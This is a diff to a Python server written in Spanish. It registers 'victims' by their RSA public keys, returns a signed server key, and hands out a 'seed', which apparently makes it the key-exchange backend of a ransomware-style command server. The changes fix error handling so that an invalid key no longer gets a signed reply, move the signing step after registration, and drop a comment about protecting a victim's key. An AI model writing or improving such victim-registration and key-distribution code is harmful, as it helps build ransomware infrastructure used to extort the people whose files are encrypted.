@@ -208,8 +208,9 @@ def validar_clave_publica(n, e):
     return clave
 
 
+
 def manejar_registro(conexion, mensaje, registro, pk_servidor_exportada, clave_privada_firma):
-    """Registra una víctima sin sustituir una identidad ya existente."""
+    """Registra una víctima y entrega la clave del servidor firmada."""
     try:
         id_victima = campo_texto(mensaje, "idV")
         clave_victima = validar_clave_publica(
@@ -217,21 +218,9 @@ def manejar_registro(conexion, mensaje, registro, pk_servidor_exportada, clave_p
             mensaje.get("pkv_e"),
         )
     except (ValueError, TypeError) as error:
-        firma_servidor = firmar_clave(
-            clave_privada_firma,
-            "servidor",
-            id_victima,
-            validar_clave_publica(
-                pk_servidor_exportada["n"],
-                pk_servidor_exportada["e"],
-            ),
-        )
-
         enviar_mensaje(conexion, {
-            "tipo": "registro_ok",
-            "pks_n": pk_servidor_exportada["n"],
-            "pks_e": pk_servidor_exportada["e"],
-            "pks_firma": firma_servidor,
+            "tipo": "error",
+            "detalle": str(error),
         })
         return
 
@@ -239,7 +228,6 @@ def manejar_registro(conexion, mensaje, registro, pk_servidor_exportada, clave_p
         existente = registro.get(id_victima)
 
         if existente is not None:
-            # No permitir que otro cliente sustituya la clave de una víctima.
             misma_clave = (
                 existente.get("pkv_n") == str(clave_victima.n)
                 and existente.get("pkv_e") == clave_victima.e
@@ -273,12 +261,24 @@ def manejar_registro(conexion, mensaje, registro, pk_servidor_exportada, clave_p
 
             print(f"Víctima registrada: {id_victima}")
 
+    clave_servidor = validar_clave_publica(
+        pk_servidor_exportada["n"],
+        pk_servidor_exportada["e"],
+    )
+
+    firma_servidor = firmar_clave(
+        clave_privada_firma,
+        "servidor",
+        id_victima,
+        clave_servidor,
+    )
+
     enviar_mensaje(conexion, {
         "tipo": "registro_ok",
         "pks_n": pk_servidor_exportada["n"],
         "pks_e": pk_servidor_exportada["e"],
+        "pks_firma": firma_servidor,
     })
-
 
 def manejar_entrega_semilla(
     conexion,
